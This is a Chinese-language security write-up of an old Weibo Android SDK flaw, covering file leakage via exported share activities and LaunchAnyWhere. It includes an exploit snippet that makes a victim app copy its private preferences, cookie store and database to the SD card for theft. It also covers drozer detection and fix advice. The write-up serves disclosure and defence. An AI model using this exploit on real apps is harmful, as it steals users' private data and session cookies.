0x1. 先前之言：

    SDK一般是指软件开发工具包，这样的工具包有支持Web服务端程序的，也有支持开发移动客户端程序的。

这样的工具包通常都是封装好的方便开发者使用某些服务或某些操作，一些服务提供商，业务代理商等经常会提供各种各样的SDK包。

开发者拿到这些SDK包时几乎都是完全信任它的且随意的在使用着，殊不知危险暗藏其中。

本笔记目的很简单，就是记录一下工作中学到的，生活中亲见的微博SDK的一个老版本漏洞。作为掌握Android安全 0.1的我，尽量还原其原理、展示其现象。


0x3. 漏洞分析


       这个漏洞就是微博SDK的一个老漏洞，漏洞在微博SDK的GitHub官网可以看到反馈的两个issues。

  • https://github.com/sinaweibosdk/weibo_android_sdk/issues/388 【通过WbShareToStoryActivity可窃取宿主应用任意私有文件数据 #388】

  • https://github.com/sinaweibosdk/weibo_android_sdk/issues/387 【WbShareTransActivity存在拉起客户端任意私有组件的问题 #387】


这里提到了两个漏洞一个可以导致安卓APP沙盒里面的私有文件泄露【应用克隆】，另一个可以导致打开APP的任意未导出的私有组件（LaunchAnyWhere）。


对于issues#388:

       当调用WbShareToStoryActivity进行分享文件到微博时，会调用到函数copyFileToWeiboTem，这个函数的操作是依据外部传人的要分享的文件uri，读取和复制一份到/scared目录的特定目录下。

摘得函数copyFileToWeiboTem部分代码如下：

packageName = "com.sina.weibo";//****************        tempPath是文件最终保存的位置String tempPath = "/Android/data/" + packageName + "/files/.composerTem/";File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + tempPath);file.mkdirs();// 根据uri读取文件ParcelFileDescriptor parcelFileDescriptor = context.getContentResolver().openFileDescriptor(uri, "r”);FileDescriptor fileDescriptor = parcelFileDescriptor.getFileDescriptor();inputStream = new BufferedInputStream(new FileInputStream(fileDescriptor));File temFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + tempPath + fileName);   if (temFile.exists()) {              temFile.delete();}// 写入文件outputStream = new FileOutputStream(temFile);byte[] buffer = new byte[1444];

这里的copyFileToWeiboTem函数调用路径为：

WbShareToStoryActivity -> onCreate ->  checkInfo[判断是否有uri，微博是否安装，是否在支持版本] -> gotoSave ->  SaveFileTask ->  doInBackground -> copyFileToWeiboTem[目标函数]

从这里的代码实现来看，调用该函数时会按照外部传入的路径读取文件后保存SD卡的 /Android/data/com.sina.weibo/files/.composerTem/ 目录下面。

我们都知道任意的APP多可以申请SD卡的读取权限，所以恶意的APP申请SD卡读取权限后，可以拿到用户在受害者APP中微博分享的被复制到上述路径下的备份文件。这至少也就造成个人信息泄露了。

从业务角度又是有需求的【设计阶段缺少安全考虑】，SDK要把图片分享给微博客户端，微博客户端又无法读取开发者APK的私有图片，所以SDK这里就先将文件搬到sd卡上，然后让微博客户端从SD卡进行读取，这样完成整个分享多媒体文件（视频、图片）的过程。

对于issues#387:


        作者描述了攻击路径，这里看到startActivity的地方，这里v0是传入的Intent的所有数据可控的，包括打开的action 和 包名都可以指定。

0x04. 漏洞证明

        

   一天无聊之中，小A在手机的软件商店里下载安装了2个APP，他想左手一个是自拍+美颜（臭美），右手一个转发给豆友和微友圈（炫耀）。

  因为这里是SDK的在分享文件时会复制一份到SD卡特定目录的设计问题，所以在正常使用中，就能得到验证。如下，当他自拍后进行微博分享时，我们可以在SD卡目录下看到已经保存了文件。

 

SD卡的/sdcard/Android/data/com.sina.weibo/files/.composerTem目录下保存一份文件。

所以，我们完全可以adb pull下来看看确认就是分享的文件。


到这里你可能不会认为是一个安全漏洞，毕竟分享出去的都是图片，且文件就是拿来公开的。但是恶意APP通过构造特定的分享文件的动作，是可以导致存在漏洞的APP里面私有的文件被泄露到SD卡的目录里面的。

下面一起来看一下安全漏洞到底是怎么产生的。直接来分析EXP吧


确定攻击链：

    

    EXP利用的是WbShareTransActivity组件，调用路径是：


WbShareTransActivity  -> onCreate -> checkSource【检查资源】 -> transPicAndVideoResource【启动异步任务CopyResourceTask】 -> CopyResourceTask ->doInBackground[遍历对象，进行copy资源到SD卡]



对于这个调用路径需要注意的是构造对象时，需要满足multiImageObject 和 videoSourceObject其中一个不为空即可.

构造恶意APP


     可以看出打开WbShareTransActivity的时候，只要传参数startActivity不为空就会进入checkSource, 在checkSource里通过weiboMultiMessage.toObject 将Intent的extras恢复成WeiboMultiMessage对象.

然后传入transPicAndVideoResource后判断WeiboMultiMessage对象.此时multiImageObject 和 videoSourceObject其中一个不为空即可。

    构造EXP 如下：




String  VICTIM_PACKAGE = “my.****.android";
String targetFile1  = "/data/data/com.l***n.f***u/shared_prefs/com.l***n.f***u_preferences.xml";String targetFile2  = "/data/data/com.l***n.f***u/shared_prefs/push_multi_process_config.xml";String targetFile3  = "/data/data/com.l***n.f***u/shared_prefs/cookieStore.xml";String targetFile4  = "/data/data/com.l***n.f***u/databases/common.db";
MultiImageObject multiImageObject = new MultiImageObject();ArrayList<Uri> pathList = new ArrayList<Uri>();

pathList.add(Uri.fromFile(new File(targetFile1)));pathList.add(Uri.fromFile(new File(targetFile2)));pathList.add(Uri.fromFile(new File(targetFile3)));pathList.add(Uri.fromFile(new File(targetFile4)));
multiImageObject.setImageList(pathList);WeiboMultiMessage weiboMultiMessage = new WeiboMultiMessage();weiboMultiMessage.multiImageObject = multiImageObject; // 绑定multiImageObject对象为目标文件list，这里就是让受害APP分享它的私有文件，然后将被泄露在SD卡目录下，恶意APP再申请SD卡读取权限即可实现私有文件的盗取。
Bundle data = new Bundle();data.putAll(weiboMultiMessage.toBundle(data));

0x5. 漏洞批量确认


      这里的漏洞已经很明确了，我们可以借助drozer 进行批量的检测，排查导出的组件中是否包含有存在漏洞的组件。

使用app.activity.info模块进行批量查看。

run app.activity.info -f "com.sina.weibo.sdk.share.WbShareTransActivity"



这里可以看到上面我们测试的2个受害APP的导出组件信息，如果发现这样的结果，就是可以利用的。其实最简单的漏洞确认就是探测到使用了微博SDK存在这样的导出组件后，直接去打开APP找找分享到微博的地方。选择文件进行正常的微博分享，然后到SD卡目录/sdcard/Android/data/com.sina.weibo/files/.composerTem下面查看是否有新的文件出现，如果出现了就说明存在漏洞。



还有一个方法是通过腾讯的APPSCAN平台进行查找存在这个漏洞组件的APP应用。


https://www.appscan.io/search-app.html#type=app&q=all:&page=13&val=activity:%22com.sina.weibo.sdk.share.WbShareTransActivity%22

0x6. 关于修复

        这是一个很老的漏洞，修复方式当然是建议升级到最新的4.4.3版本。同时建议设置SDK的这个2个组件为不可导出的，同时使用com.sina.weibo.sdk.share.WbShareResultActivity进行文件分享。
